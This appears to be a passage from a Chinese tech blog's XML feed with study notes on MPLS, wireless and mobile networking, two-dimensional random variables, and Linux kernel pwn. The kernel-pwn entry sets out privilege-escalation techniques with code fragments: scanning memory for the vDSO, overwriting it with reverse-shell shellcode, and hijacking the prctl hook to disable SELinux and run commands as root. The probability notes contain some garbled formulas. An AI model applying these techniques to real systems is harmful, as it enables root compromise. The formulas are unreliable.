MPLS有个很重要的概念就是转发等价类FEC,转发等价类就是路由器按照同样方式对待(从同样接口转发到同样的下一跳地址,且具有同祥服务类别和同祥丢弃优先级等)的分组的集合.入口结点并不是给每一个分组指派一个不同的标记,而是将属于同样FEC的分组都指派同样的标记.FEC和标记是一一对应的关系.FEC用于负载平衡,也称为流量工程TE或通信量工程. MPLS并不要求下层的网络都使用面向连接的技术,下层的网络并不提供打标记的手段,而是使用一种封装技术,在把IP数据报封装成以太网帧之前,先插入一个MPLS首部. MPLS首部共包括四个字段:标记值;试验,目前保留用作试验;栈s:在有标记栈时使用;生存时间TTL,用来防止MPLS分组在MPLS域中兜圈子.在以太网中使用值是0x8847(单播)和0x8848(组播)来表示承载的是MPLS报文(0800是IP报文）,在PPP中增加了一种新的NCP:MPLSCP,使用0x8281来标识.]]></content>
      <categories>
        <category>CS</category>
        <category>computer-network</category>
      </categories>
      <tags>
        <tag>computer-network</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CS-computer-network-无线网络和移动网络]]></title>
    <url>%2Fposts%2F2ec73776%2F</url>
    <content type="text"><![CDATA[无线局域网WLAN无线局域网WLAN指采用无线通信技术的局域网,提供了移动接入的功能.WLAN可分为两大类:有固定基础设施的和无固定基础设施的.固定基础设施是指预先建立起来的,能够覆盖一定地理范围的一批固定基站. IEEE 802.11是一个有固定基础设施的无线局域网的国际标准,也就是无线以太网的标准.使用星形拓扑,其中心叫做接入点AP,在MAC层使用CSMA/CA协议.凡使用802.11系列协议的局域网又称为Wi-Fi,即无线保真度. IEEE 802.11的基本服务集和扩展服务集 便携站,便于移动,但在工作时,其位置是固定不变的.移动站,不仅能够移动,还可以在移动的过程中进行通信. 一个基本服务集BSS包括一个基站和若干个移动站,一个本BSS的站无论要和本BSS的站进行通信,还是要和其他BSS的站进行通信,都必须通过本BSS的基站.基本服务集内的基站叫做接入点AP,其作用和网桥相似,当网络管理员安装AP时,必须为该AP分配一个不超过32字节的服务集标识符SSID和一个信道. 一个基本服务集可以是孤立的,也可通过接入点AP连接到一个主干分配系统DS,然后再接入到另一个基本服务集,构成扩展的服务集ESS.ESS还可通过门户portal为无线用户提供到非802.11无线局域网的接入,例如有线连接的互联网,门户的作用就相当于一个网桥. 一个移动站若要加入到一个基本服务集BSS,就必须先选择一个接入点AP,并与此接入点建立关联.建立关联就表示这个移动站加入了选定的AP所属的子网,并和这个AP之间创建了一个虚拟线路.只有关联的AP才能向这个移动站发送数据帧,而这个移动站也只有通过关联的AP才能向其他站点发送数据帧.若移动站使用重建关联服务,就可把这种关联转移到另一个接入点.当使用分离服务时,就可终止这种关联. 移动站与AP建立关联的方法,被动扫描:移动站等待接收接入站周期性发出的信标帧,信标帧中包含有若干系统参数,如服务集标识符SSID以及支持的速率等;主动扫描:移动站主动发出探测请求帧,然后等待从AP发回的探测响应帧.无线局域网用户在和附近的接入点AP建立关联时,一般还要键入用户密码.初期的接入加密方案称为WEP,现在的接入加密方案为WPA或WPA2. 移动站A从某一个基本服务集漫游到另一个基本服务集,仍可保持与另一个移动站B进行通信.热点是公众无线入网点,由许多热点和AP连接起来的区域叫做热区,用户可以通过无线信道接入到无线互联网服务提供者WISP,然后再经过无线信道接入到互联网. 移动自组网络移动自组网络又称为自组网络,自组网络是没有固定基础设施(即AP)的无线局域网.这种网络是由一些处于平等状态的移动站之间相互通信组成的临时网络.自组网络的服务范围通常是受限的,而且一般也不和外界的其他网络相连接.移动自组网络也就是移动分组无线网络.移动自组网络是将移动性扩展到无线领域中的自治系统,它具有自己特定的路由选择协议,并且可以不和互联网相连. 无线传感器网络无线传感器网络WSN是由大量传感器结点通过无线通信技术构成的自组网络,无线传感器网络的应用是进行各种数据的采集,处理和传输.无线传感器网络主要的应用领域就是组成各种物联网IOT. 特点:不需要很高的带宽,必须保持低功耗;对协议栈的大小有严格的限制;对网络安全性,结点自动配置,网络动态重组等方面有一定的要求. 几种不同的接入 固定接入:在作为网络用户期间,用户设置的地理位置保持不变. 移动接入:用户设置能够以车辆速度移动时进行网络通信.当发生切换时,通信仍然是连续的. 便携接入:在受限的网络覆盖面积中,用户设备能够在以步行速度移动时进行网络通信,提供有限的切换能力. 游牧接入:用户设备的地理位置至少在进行网络通信时保持不变.如用户设备移动了位置,则再次进行通信时可能还要寻找最佳的基站. 802.11局域网的物理层802.11标准中物理层相当复杂.根据物理层的不同对应的标准也不同.802.11的物理层有以下几种实现方法:直接序列扩频DSSS,正交频分复用OFDM,跳频扩频FHSS,红外线IR. 802.11局域网的MAC层协议隐蔽站问题. 暴露站问题. 无线局域网不能简单地搬用CSMA/CD协议.因为:接收到的信号强度往往会远远小于发送信号的强度,碰撞检测要求一个站点在发送本站数据的同时,还必须不间断地检测信道.难以实现;并且在发送数据时检测到信道是空闲的时候,在接收端仍然有可能发生碰撞.改进的办法是把CSMA增加一个碰撞避免CA功能.802.11就使用CSMA/CA协议.在使用CSMA/CA的同时,还增加使用停止等待协议. MAC层通过协调功能来确定在基本服务集BSS中的移动站在什么时间能发送数据或接收数据.DCF子层在每一个结点使用CSMA机制的分布式接入算法,让各个站通过争用信道来获取发送权.因此DCF向上提供争用服务.PCF子层使用集中控制的接入算法把发送数据权轮流交给各个站从而避免了碰撞的产生.自组网络就没有PCF子层. 所有的站在完成发送后,必须再等待一段很短的时间(继续监听)才能发送下一帧.这段时间的通称是帧间间隔IFS.帧间间隔长度取决于该站欲发送的帧的类型,高优先级帧需要等待的时间较短,因此可优先获得发送权.若低优先级帧还没来得及发送而其他站的高优先级帧已发送到媒体,则媒体变为忙态,因而低优先级帧就只能再推迟发送了.这样就减少了发生碰撞的机会. SIFS,即短帧间间隔,长度为28μs,是最短的帧间间隔,用来分隔开属于一次对话的各帧.一个站应当能够在这段时间内从发送方式切换到接收方式.使用SIFS的帧类型有:ACK帧,CTS帧,由过长的MAC帧分片后的数据帧,以及所有回答AP探询的帧和在PCF方式中接入点AP发送出的任何帧. DIFS,即分布协调功能帧间间隔,它比SIFS的帧间间隔要长得多,长度为128μs.在DCF方式中,DIFS用来发送数据帧和管理帧. 虚拟载波监听:让源站将它要占用信道的时间(包括目的站发回确认帧所需的时间)通知给所有其他站,以便使其他所有站在这一段时间都停止发送数据.这样就大大减少了碰撞的机会.其他站实际上并没有监听信道,而是由于其他站收到了源站的通知才不发送数据.源站的通知就是源站在其MAC帧首部中的第二个字段持续时间中填入了在本帧结束后还要占用信道多少时间(以微秒为单位),包括目的站发送确认帧所需的时间. 当一个站检测到正在信道中传送的MAC帧首部的持续时间字段时,就调整自己的网络分配向量NAV.NAV指出必须经过多少时间才能完成数据帧的这次传输,才能使信道转入到空闲状态.信道从忙态变为空闲时,任何一个站要发送数据帧时,不仅都必须等待一个DIFS的间隔,而且还要进入争用窗口,并计算随机退避时间以便再次重新试图接入到信道.在信道从忙态转为空闲时,为了避免几个站同时发送数据,各站就要执行退避算法,以减少发生碰撞的概率. 802.11使用二进制指数退避算法. 退避计时器:站点每经历一个时隙的时间就检测一次信道,若检测到信道空闲,退避计时器就继续倒计时.若检测到信道忙,就冻结退避计时器的剩余时间,重新等待信道变为空闲,并再经过时间DIFS后,从剩余时间开始继续倒计时.当退避计时器的时间减小到零时,就开始发送整个数据帧. 仅在下面的情况下才不使用退避算法:检测到信道是空闲的,并且这个数据帧是要发送的第一个数据帧.除此以外的所有情况,都必须使用退避算法. CSMA/CA算法归纳. 若站点最初有数据要发送(而不是重传)且检测到信道空闲,在等待时间DIFS后,就发送整个数据帧. 否则,站点就要等检测到信道空闲并经过时间DIFS后,执行CSMA/CA协议的退避算法,启动退避计数器.在退避计数器减少到零之前,一旦检测到信道忙,就冻结退避计时器.一旦信道空闲,退避计时器就进行倒计时. 当退避计时器时间减少到零时,站点就发送整个的帧并等待确认. 发送站若收到确认,就知道已发送的帧被目的站正确收到了.这时如果要发送第二帧,就要从上面的步骤2开始.若源站在规定时间内没有收到确认帧ACK(由重传计时器控制这段时间),就必须重传此帧(再次使用 CSMA/CA协议争用接入信道),直到收到确认为止,或者经过若干次的重传失败后放弃发送. 为了更好地解决隐蔽站带来的碰撞问题,802.11允许要发送数据的站对信道进行预约.一个站在发送数据帧之前发送一个RTS帧,当接收方愿意接收额外的流量时,它会响应一个CTS帧. 802.11局域网的MAC帧802.11帧共有三种类型:控制帧,数据帧和管理帧. MAC首部,共30字节.帧主体,也就是帧的数据部分,不超过2312字节.802.11帧的长度通常都小于1500字节.帧检验序列FCS是尾部,共4字节. MAC首部:序号控制字段占16位,其中序号子字段占12位,分片子字段占4位;持续期字段占16位;帧控制字段共分为11个子字段,协议版本字段现在是0,类型字段和子类型字段用来区分帧的功能,更多分片字段置为1时表明这个帧属于一个帧的多个分片之一,有线等效保密字段WEP占1位.若WEP = 1,就表明采用了WEP加密算法; 802.11数据帧最特殊的地方就是有四个地址字段.地址4用于自组网络.前三个地址组成如下. 例如:站点A向B发送数据帧,数据帧必须经过AP1转发. 为了提高传输效率,在信道质量较差时,需要把一个较长的帧划分为许多较短的分片. 无线个人区域网WPANWPAN就是在个人工作地方把属于个人使用的电子设备用无线技术连接起来自组网络,不需要使用接入点AP.整个网络的范围大约在10m左右. WPAN的IEEE标准由IEEE的802.15工作组制定,这个标准也是包括MAC层和物理层这两层的标准.WPAN都工作在2.4GHz的ISM频段. 最早使用的WPAN是1994年爱立信公司推出的蓝牙系统,其标准是IEEE 802.15.1.蓝牙的数据率为720kbit/s,通信范围在10米左右.蓝牙使用TDM方式和扩频跳频FHSS技术组成不用基站的皮可网.每一个皮可网有一个主设备和最多7个工作的从设备.通过共享主设备或从设备,可以把多个皮可网链接起来,形成一个范围更大的扩散网. 低速WPAN主要用于工业监控组网,办公自动化与控制等领域,其速率是2~250kbit/s.标准是IEEE 802.15.4.低速WPAN中最重要的就是ZigBee.ZigBee技术主要用于各种电子设备之间的无线通信,其特点:功耗非常低,网络容量大,一个ZigBee的网络最多包括有255个结点.IEEE 802.15.4只是定义了ZigBee协议栈的最低的两层(物理层和MAC层),而上面的两层(网络层和应用层)则是由ZigBee联盟定义的.IEEE 802.15.4物理层使用的三个频段. 在MAC层,主要沿用802.11无线局域网标准的CSMA/CA协议.在网络层,ZigBee可采用星形和网状拓扑,或两者的组合. ZigBee的结点按功能的强弱可划分为两大类:全功能设备FFD(具备控制器的功能,能够提供数据交换),精简功能设备RFD(只能与处在该星形网中心的FFD结点交换数据).在一个ZigBee网络中有一个FFD充当该网络的协调器,通过各网络协调器的相互通信,可以得到覆盖更大范围,超过65000个结点的ZigBee网络. 高速WPAN用于在便携式多媒体装置之间传送数据,支持11~55Mbit/s的数据率,标准是802.15.3.IEEE 802.15.3a工作组还提出了更高数据率的物理层标准的超高速WPAN,它使用超宽带UWB技术.UWB技术工作在3.1~10.6GHz微波频段,有非常高的信道带宽.超宽带信号的带宽应超过信号中心频率的25%以上,或信号的绝对带宽超过500MHz.超宽带技术使用了瞬间高速脉冲,可支持100~400 Mbit/s的数据率,可用于小范围内高速传送图像或DVD质量的多媒体视频文件. 无线城域网WMAN无线城域网的标准为IEEE 802.16,WMAN可提供最后一英里的宽带无线接入.在许多情况下,无线城域网可用来代替现有的有线宽带接入,因此有时又称为无线本地环路.WiMAX常用来表示无线城域网WMAN,这与Wi-Fi常用来表示无线局域网WLAN相似. WMAN有两个正式标准:802.16d,固定宽带无线接入空中接口标准(2~66GHz频段).802.16e,支持移动性的宽带无线接入空中接口标准(2~6GHz频段),向下兼容802.16d. 蜂窝移动通信网第一代(1G)蜂窝无线通信是为话音通信设计的模拟FDM系统.第二代(2G)蜂窝无线通信提供低速数字通信(短信服务),其代表性体制就是最流行的GSM系统.2.5G技术是从2G向第三代(3G)过渡的衔接性技术,如GPRS和EDGE等.第三代(3G)移动通信和计算机网络的关系非常密切,它使用IP的体系结构和混合的交换机制(电路交换和分组交换),能够提供移动宽带多媒体业务.从3G开始以后的各代蜂窝移动通信都是以传输数据业务为主的通信系统,而且必须兼容2G的功能,这就是所谓的向后兼容. 第四代(4G)正式名称是IMT-Advanced,意思是高级国际移动通信.4G的一个重要技术指标就是要实现更高的数据率,目标峰值数据率是:固定的和低速移动通信时应达到1Gbit/s,在高速移动通信时应达到100 Mbit/s.4G现有两个国际标准:LTE,又分为时分双工TD-LTE和频分双工FDD-LTE两种.把带宽增加到20MHz,采用了高阶调制64QAM和MIMO技术;LTE-A是LTE的升级版,俗称为3.9G,带宽高达100 MHz. 移动IP移动IP(Mobile IP)又称为移动IP协议,是由IETF开发的一种技术.这种技术允许计算机移动到外地时,仍然保留其原来的IP地址.移动IP要解决的问题:使用户的移动性对上层的网络应用是透明的. 移动站A必须有一个原始地址,即永久地址,或归属地址,移动站原始连接到的网络叫做归属网络,归属网络中使用的代理叫做归属代理.当移动站A移动到另一个地点,接入的网络称为被访网络或外地网络,被访网络中使用的代理叫做外地代理.为移动站A在被访网络中创建的临时地址叫做转交地址. ① B发送给A的数据报被A的归属代理截获了(只有当A离开归属网络时,归属代理才能截获发给A的数据报). ② 归属代理把B发来的数据报进行再封装,新的数据报的目的地址是A现在的转交地址.新封装的数据报发送到被访网络的外地代理.这里使用的是隧道技术或IP-in-IP. ③ 被访网络中的外地代理把收到的封装的数据报进行拆封,取出B发送的原始数据报,然后转发给移动站A.这个数据报的目的地址就是A的永久地址.A收到B发送的原始数据报后,也得到了B的IP地址. ④ 如果现在A要向B发送数据报,那么情况就比较简单.A仍然使用自己的永久地址作为数据报的源地址,用B的IP地址作为数据报的目的地址.这个数据报显然没有必要在通过A的归属代理进行转发了. 网络层应增加的新功能:移动站到外地代理的协议,外地代理到归属代理的登记协议,归属代理数据报封装协议,外地代理拆封协议. 间接路由选择:把数据报发往移动站的归属网络,由归属代理完成以后的寻址工作,进而完成数据报转发的方式.间接路由选择可能会引起数据报转发的低效,文献中称之为三角形路由选择问题:意思是本来在B和A之间可能有一条更有效的路由,但现在要走另外两条路,先要把数据报从B发送到A的归属代理,然后再转发给漫游到被访网络的A. 使用直接路由选择向移动站发送数据报:让通信者B创建一个通信者代理,让这个通信者代理向归属代理询问到移动站在被访网络的转交地址.然后由通信者代理把数据报用隧道技术发送到被访网络的外地代理,最后再由这个外地代理拆封,把数据报转发给移动站.但这是以增加复杂性为代价的. ① B的通信者代理从移动站A的归属代理得到A所漫游到的被访网络N1的外地代理.把移动站首次漫游到的被访网络的外地代理称为锚外地代理.② 通信者代理把B发给A的数据报再封装后,发送到A的锚外地代理.③ 锚外地代理把拆封后的数据报发送给A.④ A移动到另一个被访网络N2.⑤ A向被访网络N2的新外地代理登记.⑥ 新外地代理把A的新转交地址告诉锚外地代理.⑦ 当锚外地代理收到发给A的封装数据报后,就用A的新转交地址对数据报进行再封装,然后发送给被访网络N2上的新外地代理.在拆封后转发给移动站A.同理,如果移动站再漫游到另一个网络,则这个网络的外地代理将仍然要和锚外地代理联系,以便让锚外地代理以后把发给A的数据报转发过来. 蜂窝移动通信网中对移动用户的路由选择首先找到移动用户的归属网络.然后归属MSC向其HLR查询现在被叫移动用户的位置.HLR向归属MSC返回被叫移动用户的移动站漫游号MSRN. 归属MSC按照所得到的漫游号码MSRN进行呼叫的第二段,把通信者发起的呼叫从归属MSC传送到被访网络的MSC,再传送到该移动用户所漫游到的小区的基站. GSM中的切换切换就是移动用户与相关联的基站发生了改变.移动用户在和一个基站相关联期间,会周期性地测量来自其当前基站及其邻近基站的信标信号强度,并将测量结果以每秒1 ~ 2次频率报告给当前基站.根据这些测量数据以及邻近蜂窝的当前负载情况,当前基站决定是否发起切换. 移动站的切换可能仍处在同一个MSC的控制下,而只是相关联的基站发生了变化.但在许多情况下,移动站的切换是相关联的MSC都改变了.在这种情况下,向移动站的呼叫路由会有很大的变化. 无线网络对高层协议的影响无线网络在移动站漫游时,会经常更换移动用户到无线网络的连接点(即到移动站相关联的基站),网络的连接就会发生很短时间的中断.由于移动用户更新相关联的基站需要一定的时间,这就可能造成TCP报文段的丢失.只要出现TCP报文段频繁丢失,TCP的拥塞控制就会采取措施,减小其拥塞窗口,从而使TCP发送方的报文段发送速率降低. 当无线信道出现严重的比特差错,或由于切换产生了报文段丢失,减小TCP发送方的拥塞窗口对改善网络性能并不会有任何好处. 解决方法:本地恢复,指差错在什么地方出现,就在什么地方改正;让TCP发送方知道什么地方使用了无线链路.只有当TCP能够确知,是有线网络部分发生了拥塞时,TCP才采用拥塞控制的策略.把含有移动用户的端到端TCP连接拆成两个互相串接的TCP连接. 两种不同无线上网目前蜂窝移动网络的运营商的上网收费都是按照用户所消耗的数据流量来计算的.宽带入网一般都是根据用户使用的带宽多少,按使用的时间付费的.]]></content>
      <categories>
        <category>CS</category>
        <category>computer-network</category>
      </categories>
      <tags>
        <tag>computer-network</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[mathematics-probability-theory-多维随机变量及其分布]]></title>
    <url>%2Fposts%2F5763fcaf%2F</url>
    <content type="text"><![CDATA[前言在某些实际问题中,往往需要同时用两个或两个以上的随机变量来描述试验的结果,这个时候就要考虑多维随机变量及其分布. 二维随机变量定义:设E是一个随机试验,样本空间是S = {e},设X = X(e)和Y = Y(e)是定义在S上的r.v.,由它们构成的一个向量(X, Y),叫做二维随机变量. 二维随机变量(X, Y)的性质不仅与X和Y有关,而且还依赖于这两个r.v.的相互关系. 二维r.v.(联合)分布函数定义:对于任意的实数x,y,二元函数F(x, y) = P{(X &lt;= x) ∩ (Y &lt;= y)} = P{X &lt;= x,Y &lt;= y}. P{x1 &lt; X &lt;= x2,y1 &lt; Y &lt;= y2} = F(x2, y2) - F(x1, y2) - F(x2, y2) + F(x1, y1). 二维r.v.的分布函数的基本性质与一维r.v.的分布函数的性质类似. F(x, y)是变量x和y的不减函数. 0 &lt; F(x, y) &lt; 1,且对于任意固定的y,F(负无穷大, y) = 0;对于任意固定的x,F(x, 负无穷大) = 0;F(负无穷大, 负无穷大) = 0;F(正无穷大, 正无穷大) = 1. F(x + 0, y) = F(x, y),F(x, y + 0) = F(x, y),即F(x, y)关于x右连续,关于y也右连续. P{x1 &lt; X &lt;= x2,y1 &lt; Y &lt;= y2} &gt; 0. 二维随机变量的分布律二维离散型随机变量的分布律若离散型随机变量(X, Y)的所有可能取值是有限对或可列多对则称(X, Y)为离散型二维离散型随机变量. 二维连续型r.v.的概率密度 联合概率密度f(x, y)的性质. 边缘分布边缘分布函数:对于二维随机变量(X, Y),它作为一个整体,具有分布函数F(x, y),同时X,Y作为随机变量也有分布函数.称为二维随机变量(X, Y)关于X,Y的边缘分布函数. 同理可知二维随机变量(X, Y)关于Y的边缘分布函数.易知二维离散型r.v.的边缘分布律. 连续型的边缘概率密度. 由二维随机变量(X, Y)的概率分布可唯一地确定X和Y的边缘分布,反之不能. 条件分布二维离散型r.v.的条件分布. 二维连续型r.v.的条件分布. 二维连续型随机变量和离散型随机变量的比较 连续型二维r.v.的均匀分布 二元均匀分布的条件分布仍为均匀分布. 连续型二维r.v.的正态分布 相互独立的随机变量由两个事件相互独立的概念可引出两个随机变量相互独立的概念. 设(X, Y)服从二维正态分布,则X,Y相互独立的充要条件是ρ = 0. 一些n元随机变量的概念和结果 两个r.v.的函数的分布 Z = X + Y的分布 正太r.v.的线性组合 max(X, Y)与min(X, Y)]]></content>
      <categories>
        <category>mathematics</category>
      </categories>
      <tags>
        <tag>probability-theory</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[binary-漏洞分析-Linux-kernel-pwn-任意地址读写到权限提升]]></title>
    <url>%2Fposts%2F39d772de%2F</url>
    <content type="text"><![CDATA[0x00记录通过任意地址读写进行提权的各种操作. 搜索cred结构体可以通过prctl函数中的PR_SET_NAME功能设置task_struct里的char comm[TASK_COMM_LEN]成员为一个特殊值,再利用内存任意读找到task_structure结构体,从而找到cred结构体. 由于task_structure是kmem_cache_alloc_node,因此task_struct应该存在内核的动态分配区域,爆破范围应该在0xffff880000000000 ~ 0xffffc80000000000. 例子:https://github.com/mncoppola/StringIPC/blob/master/solution/solution.c. vDSO重写由于vDSO同时映射在内核空间以及每一个进程的虚拟内存中,包括那些以root权限运行的进程.通过调用那些不需要上下文切换的系统调用可以加快定位vDSO.vDSO在用户空间映射为R/X,而在内核空间为R/W,所以可以在内核空间修改它,接着在用户空间执行. 定位vDSO有两种方法. 第一种是读取/proc/kallsyms,通过vdso_pages直接获取这些地址. 第二种则是在内核空间中搜寻每一个页的开头,看是否有ELF头或者部分vDSO的映射,还可以通过vDSO的标志进一步缩小这些页的范围.下面是实现这个思路的代码. 1234567891011121314void * header = 0;void * loc = 0xffffffff80000000;size_t i = 0;for (;loc &lt; 0xffffffffffffafff;loc += 0x1000) &#123; readMem(&amp;header, loc, 8); if (header == 0x010102464c457f) &#123; fprintf(stderr, "%p elf\n", loc); readMem(&amp;header, loc + 0x270, 8); if (header == 0x65675f6b636f6c63) &#123; fprintf(stderr, "%p found it?\n", loc); break; &#125; &#125;&#125; 找到了vDSO所在的区域后就能用shellcode来覆盖. 此处用到的shellcode只为root进程创建反弹shell,因为每一个调用gettimeofday的进程都会触发shellcode,可以通过调用sys_getuid系统调用并将结果与0进行比较来找到root权限进程. 没有root权限则继续调用sys_gettimeofday系统调用.在root进程当中通过0x39系统调用fork一个子进程,父进程继续执行sys_gettimeofday,而由子进程来执行反弹shell(或者提权). shellcode参考. vDSO不是唯一一个同时映射在内核空间和用户空间的内存,在x86-64当中,vSYSCALL与vDSO实现类似的功能,但多了一点特性就是每次重启都在同一个位置. vDSO/vSYSCALL overwriting是一个非常有用的技术,它能够用在对于中断上下文(interrupt context)的利用,因为它不需要本地进程来映射一段内存,或者提升权限.但是新的内核可以通过设置编译参数使vDSO内核态不可写. 在高版本的glibc中,可以通过以下代码获得vdso的地址. 123456#include &lt;sys/auxv.h&gt; unsigned long sysinfo_ehdr = getauxval(AT_SYSINFO_EHDR);if (!sysinfo_ehdr) &#123; printf("AT_SYSINFO_EHDR is not present!\n"); return 0;&#125; HijackPrctlinclude/linux/security.h. 1extern int cap_task_prctl(int option, unsigned long arg2, unsigned long arg3, unsigned long arg4, unsigned long arg5); 在kernel/sys.c中,可以发现prctl系统调用将参数原封不动的传给了security_task_prctl函数进行处理. 12345678SYSCALL_DEFINE5(prctl, int, option, unsigned long, arg2, unsigned long, arg3, unsigned long, arg4, unsigned long, arg5) &#123; struct task_struct *me = current; unsigned char comm[sizeof(me-&gt;comm)]; long error; error = security_task_prctl(option, arg2, arg3, arg4, arg5); /* code */&#125; 而security_task_prctl函数最后调用了虚表函数. 123456789101112131415int security_task_prctl(int option, unsigned long arg2, unsigned long arg3, unsigned long arg4, unsigned long arg5) &#123; int thisrc; int rc = -ENOSYS; struct security_hook_list *hp; hlist_for_each_entry(hp, &amp;security_hook_heads.task_prctl, list) &#123; thisrc = hp-&gt;hook.task_prctl(option, arg2, arg3, arg4, arg5); if (thisrc != -ENOSYS) &#123; rc = thisrc; if (thisrc != 0) break; &#125; &#125; return rc;&#125; 调试发现这个hook位于capability + 0x520 + 0x18这个偏移,可以通过修改这个指针,从而劫持控制流.但是prctl系统调用第一个参数是int类型的,导致64位系统第一个参数如果是64位的话会被截断. 这不影响32位下的漏洞利用,先通过劫持hook为set_memory_rw,然后传入vDSO的地址,将vDSO修改为可写,之后的就可以劫持vDSO.64位下是不可行的,因为第一个参数被截断了. call_usermoderhelper是内核运行用户程序的一个api,有root权限.通过它就能以root权限执行想要执行的程序.call_usermoderhelper的第一个参数也是64位的,不能直接劫持. 但是内核中有些代码片段是调用call_usermoderhelper的.比如kernel/reboot.c中的orderly_poweroff函数中调用run_cmd(poweroff_cmd),poweroff_cmd是一个全局变量,可以修改. 所以64位下的整体思路. 通过任意地址读泄露出vDSO地址. 利用vDSO和kernel_base相差不远的特性,露出内核基址. 篡改prctl的hook为selinux_disable函数的地址. 调用prctl使得selinux失效.这一步与上一步是安卓root必须的两步. 篡改poweroff_cmd为目的命令. 篡改prctl的hook为orderly_poweroff. 调用prctl执行预期命令内核提权.]]></content>
      <categories>
        <category>binary</category>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>kernel-pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[binary-漏洞分析-Linux-kernel-pwn-调试]]></title>
    <url>%2Fposts%2Fb79717f3%2F</url>
    <content type="text"><![CDATA[安装内核123456uname -r#查看本机的内核sudo apt-get install linux-headers-version-generic linux-image-version-generic linux-image-extra-version-generic#安装对应版本内核sudo dpkg --list | grep linux-image#查看已安装的内核版本 编译内核linux内核源代码下载:https://mirrors.tuna.tsinghua.edu.cn/kernel/. 12make mrpropermake menuconfig 重点配置(有些配置可能因为版本不同而不一样). 取消KernelHacking --&gt; Write protect kernel read-only data structures. 取消Processor type and features --&gt; Paravirtualized guest support. 选中KernelHacking --&gt; Compile the kernel with debug info. 选中KernelHacking --&gt; Compile the kernel with frame pointers. 全选KernelHacking --&gt; KGDB:kernel debugging with remote gdb,其下的全部都选中. 12make bzImage -j8 &amp;&amp; make vmlinux -j8#编译基本的内核 123456make modules -j8#编译内核模块sudo make modules_install#将编译好的模块(.ko文件)拷贝到/lib/modules/liunx-x.xx.x文件夹,内核启动时加载sudo make install#编译出来的压缩内核镜像拷贝到/boot/文件夹下,并且修改/boot/grub/grub.cfg这个grub配置文件. 安装符号文件1234567891011121314codename=$(lsb_release -c | awk '&#123;print $2&#125;')sudo tee /etc/apt/sources.list.d/ddebs.list &lt;&lt; EOFdeb http://ddebs.ubuntu.com/ $&#123;codename&#125; main restricted universe multiversedeb http://ddebs.ubuntu.com/ $&#123;codename&#125;-security main restricted universe multiversedeb http://ddebs.ubuntu.com/ $&#123;codename&#125;-updates main restricted universe multiversedeb http://ddebs.ubuntu.com/ $&#123;codename&#125;-proposed main restricted universe multiverseEOF#添加源wget -O - http://ddebs.ubuntu.com/dbgsym-release-key.asc | sudo apt-key add -#添加访问符号服务器的密钥sudo apt-get updateapt-cache search linux-image | grep dbgsymsudo apt-get install linux-image-`uname -r`-dbgsym#安装当前内核的符号文件 符号文件会被安装到/usr/lib/debug/目录下,最重要的kernel文件在boot子目录下. 安装源代码启用deb-src源,然后sudo apt-get update更新. 123apt-cache search linux-sourcesudo apt-get install linux-source-4.15.0#安装4.15.0内核的源代码 源代码的压缩包会被放在/usr/src目录下的同名文件夹下. qemu + gdbbusybox用busybox来生成文件系统,编译配置(有些配置可能因为版本不同而不一样). 设置Busybox Settings --&gt; Build Options -&gt; Build Busybox as a static binary. 关闭Linux System Utilities --&gt; Support mounting NFS file system. 关闭Networking Utilities --&gt; inetd 编译成x86.在如下两个选项中输入对应的值. 12(-m32 -march=i386) Additional CFLAGS(-m32) Additional LDFLAGS 12345make menuconfig#32位编译需要运行下面两条指令#cd /usr/include#sudo ln -s asm-generic/ asmmake install -j8 make install后,在busybox源代码目录下有一个_install目录存放编译后的文件. 1234cd _installmkdir proc sys dev etc etc/init.dvim etc/init.d/rcSchmod +x etc/init.d/rcS etc/init.d/rcS. 1234#!/bin/shmount -t proc none /procmount -t sysfs none /sys/sbin/mdev -s 调用find . | cpio -o --format=newc &gt; ../rootfs.img创建文件系统. 调试123456789qemu-system-x86_64 -kernel bzImage -initrd rootfs.img -append "console=ttyS0 root=/dev/ram rdinit=/sbin/init" -smp cores=1,threads=1 -cpu kvm64,+smep,+smap --nographic -gdb tcp::1234#-cpu kvm64,+smep,+smap.设置CPU的安全选项.开启smap和smep.#-kernel.设置内核bzImage文件的路径.#-initrd.设置内核启动的文件系统.#-gdb tcp::1234.设置gdb的调试端口.#-append.附加选项,指定no kaslr可以关闭随机偏移.#-m.指定内存大小#-smp.设置内核数和线程数#--nographic和console=ttyS0一起使用启动的界面就会变成当前终端 gdb调试. 12345sudo gdb -q ./vmlinux#加载vmlinux符号文件.gdb&gt; target remote :1234gdb&gt; add-symbol-file ./test.ko &lt;addr of test.ko&gt;#addr of test.ko可以通过cat /proc/modules | grep test.ko获得.需要root权限,修改init文件获得. 双机调试虚拟机配置首先移除打印机,然后配置双机的串口. host. target. 配置target12sudo vim /etc/grub.d/40_customsudo update-grub /etc/grub.d/40_custom. 12345678910111213141516171819202122#!/bin/shexec tail -n +3 $0# This file provides an easy way to add custom menu entries. Simply type the# menu entries you want to add after this comment. Be careful not to change# the &apos;exec tail&apos; line above.menuentry &apos;KGDB&apos; --class ubuntu --class gnu-linux --class gnu --class os $menuentry_id_option &apos;gnulinux-simple-1dd33836-1426-45f7-8cfb-5667fb92953d&apos; &#123; recordfail load_video gfxmode $linux_gfx_mode insmod gzio if [ x$grub_platform = xxen ]; then insmod xzio; insmod lzopio; fi insmod part_msdos insmod ext2 set root=&apos;hd0,msdos1&apos; if [ x$feature_platform_search_hint = xy ]; then search --no-floppy --fs-uuid --set=root --hint-bios=hd0,msdos1 --hint-efi=hd0,msdos1 --hint-baremetal=ahci0,msdos1 1dd33836-1426-45f7-8cfb-5667fb92953d else search --no-floppy --fs-uuid --set=root 1dd33836-1426-45f7-8cfb-5667fb92953d fi linux /boot/vmlinuz-4.15.0-91-generic root=UUID=1dd33836-1426-45f7-8cfb-5667fb92953d ro find_preseed=/preseed.cfg auto noprompt priority=critical locale=en_US quiet kgdbwait kgdb8250=io,03f8,ttyS0,115200,4 kgdboc=ttyS0,115200 kgdbcon nokaslr initrd /boot/initrd.img-4.15.0-91-generic&#125; 该文件可以添加grup启动选项,只需要常规选项中的内核命令行处增加KGDB选项:kgdbwait kgdb8250=io,03f8,ttyS0,115200,4 kgdboc=ttyS0,115200 kgdbcon nokaslr. kgdbwait让系统启动时就进入调试模式,kgdboc是KGDB over console的缩写,ttyS0代表通过1号串口进行通信,波特率为115200.后面的nokaslr是禁止内核空间的地址随机化. 配置host1234sudo stty -F /dev/ttyS0 